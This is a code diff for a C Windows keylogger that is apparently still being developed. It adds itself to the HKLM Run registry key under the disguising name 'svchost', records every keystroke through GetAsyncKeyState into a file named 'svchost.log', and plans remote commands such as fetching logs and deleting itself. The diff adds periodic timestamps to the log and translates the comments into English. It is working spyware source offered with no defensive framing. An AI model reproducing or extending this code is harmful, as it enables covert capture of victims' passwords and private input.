@@ -13,6 +13,7 @@
 
 //DO NOT DELETE COMMENTS ABOVE THIS.
 
+
 /*
 Plan:
 
@@ -20,21 +21,30 @@ commands from client to server:
 	run
 	sleep
 	get_loggs
-	delete_program
+	delete_programm
 
 */
 
-#define _CRT_SECURE_NO_WARNINGS //VS2013 require this stuff, not to show warnings.
 
 #include <windows.h>
 #include <Windows.h>   //For sleep() function.
 #include <stdio.h>
 #include <winuser.h>
 #include <windowsx.h>
-#include <dos.h> 
+#include <time.h>
+#include <conio.h>
 
-
+#define _CRT_SECURE_NO_WARNINGS //VS2013 require this stuff, not to show warnings.
 #define BUFSIZE 80
+#define MIN_DIFF 120//2 min
+#define CHECK_TIME	t_time2 = clock()/CLOCKS_PER_SEC; \
+					if (t_time2 - t_time1 >= MIN_DIFF)\
+					{fputs("\n", file);\
+					fputs(asctime(t_m), file);\
+					t_time1 = t_time2; }\
+//время		
+		
+
 
 int test_key(void);
 int create_key(char *);
@@ -74,15 +84,14 @@ int test_key(void)
     DWORD buf_length=BUFSIZE;
     int reg_key;
     
-    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);//Opening stated key.
+    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);//opens the specified key
     if(reg_key!=0)
     {    
         check=1;
         return check;
     }        
            
-    reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);//Returns type and data of stated key by name, associated
-                                                  //with openned register key. (указанного значения по имени, ассоциирующимся с открытым ключом реестра.)
+    reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);//returns the type of data and the specified value name associated with an open registry key
     
     if((reg_key!=0)||(buf_length>BUFSIZE))
         check=2;
@@ -99,14 +108,10 @@ int create_key(char *path)
         
         HKEY hkey;
         
-        reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
-		//Creating stated key. If key exists, than function opens it.
-		//создает указанный ключ. Если ключ уже существует в реестре, то функция открывает его.
+        reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);//It creates the specified key. If the key already exists in the registry, the function opens it
         if(reg_key==0)
         {
-                RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));
-				//Saves data into opened register key field. Also can set additional values and data types for selected key.
-				//сохраняет данные в поле значения открытого ключа реестра. Она, также, может устанавливать дополнительные значения и типы информации для указанного ключа.
+                RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));//saves the data in the values of open registry key. She, too, may establish additional value and type information for the specified key
                 //REG_SZ ~ KEY_QUERY_VALUE 
 				
 				check=0;
@@ -121,21 +126,36 @@ int create_key(char *path)
 
 int get_keys(void)
 {
+	FILE *file;
+	time_t t;
+	struct tm *t_m;
+	t = time(NULL);
+	t_m = localtime(&t);
+
+	file = fopen("svchost.log", "a+");
+	fputs("\n\nLast running \n", file);
+	fputs(asctime(t_m), file);
+	fclose(file);
 	short character;
+
+	int t_time1 = clock() / CLOCKS_PER_SEC;
+	int t_time2;
+
+
 	while (1)
 	{
 		Sleep(10);/*to prevent 100% cpu usage*/
 		for (character = 8; character <= 222; character++)
 		{
 			if (GetAsyncKeyState(character) == -32767)
-//Detects if key is pressed or released.			
-//When the function was called or after last use of GetAsyncKeyState().
-//устанавливает, в нажатом или отпущенном состоянии находится клавиша во время, 
-//когда вызывается функция и была ли клавиша нажата после предыдущего вызова GetAsyncKeyState().
+//sets, pressed or unpressed condition is key at the time, 
+//when the function is called and whether a key is pressed after the previous call GetAsyncKeyState().
 			{
-
-				FILE *file;
 				file = fopen("svchost.log", "a+");
+				CHECK_TIME
+
+				//FILE *file;
+				
 				if (file == NULL)
 				{
 					return 1;
@@ -215,6 +235,7 @@ int get_keys(void)
 							fputs("['\"]", file);
 							fclose(file);
 							break;
+
 							case VK_OEM_PLUS:
 							fputc('+',file);
 							fclose(file);
@@ -231,6 +252,7 @@ int get_keys(void)
 							fputc('.',file);
 							fclose(file);
 							break;
+
 						case VK_NUMPAD0:
 							fputc('0', file);
 							fclose(file);
